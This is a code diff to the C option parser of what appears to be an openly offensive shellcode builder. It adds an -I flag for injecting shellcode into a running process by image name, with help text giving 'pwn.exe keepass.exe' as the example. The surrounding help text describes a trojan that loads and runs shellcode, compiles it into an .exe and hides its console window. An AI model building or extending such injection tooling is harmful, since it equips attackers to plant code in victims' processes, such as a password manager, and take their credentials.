@@ -26,6 +26,7 @@ int main (int argc, char **argv)
 	char *evalue = NULL;
 	char *fvalue = NULL;
 	char *ivalue = NULL;
+	char *Ivalue = NULL;
 	int hflag = 0;
 	int Fflag = 0;
 	int Xflag = 0;
@@ -40,7 +41,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "d:e:f:i:lphFXqP")) != -1)
+	while ((c = getopt (argc, argv, "d:e:f:i:I:lphFXqP")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -58,6 +59,9 @@ int main (int argc, char **argv)
 			case 'i':
 				ivalue = optarg;
 				break;
+			case 'I':
+				Ivalue = optarg;
+			      	break;
 			case 'h':
 				hflag = 1;
 				break;
@@ -85,6 +89,8 @@ int main (int argc, char **argv)
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
 				else if (optopt == 'i')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+				else if (optopt == 'I')
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);				
 				else if (isprint (optopt))
 					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
 				else
@@ -169,6 +175,16 @@ int main (int argc, char **argv)
 			printf("-i %s unknown option\n");
 	}
 
+	//Image name
+	if(Ivalue)
+	{
+		FILE *file_def;
+		file_def = fopen ("defs.h","a");
+		fseek (file_def, 0, SEEK_END);
+		fprintf (file_def, "#define IMAGE \"%s\"\n", Ivalue);
+		fclose (file_def);
+	}
+
 	//write flags to defs.h
 	FILE *file_def;
 	file_def = fopen ("defs.h","a");
@@ -201,9 +217,12 @@ void print_help()
 	printf("Options:\n");
 	printf("-i inject\n");
 	printf("\t-i shellcode for injecting shellcode\n");
+	//printf("\t-i dll for injecting a dll\n");
+	//printf("\t-i exe for injecting an executable\n");	
 	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
+	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
-	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
+	printf("-f compile and execute shellcode into .exe, needs filename of shellcode file\n");
 	printf("-X compile for 64 bit\n");
 	printf("-p print debug information\n");
 	printf("-q quiet mode (hide console window)\n");
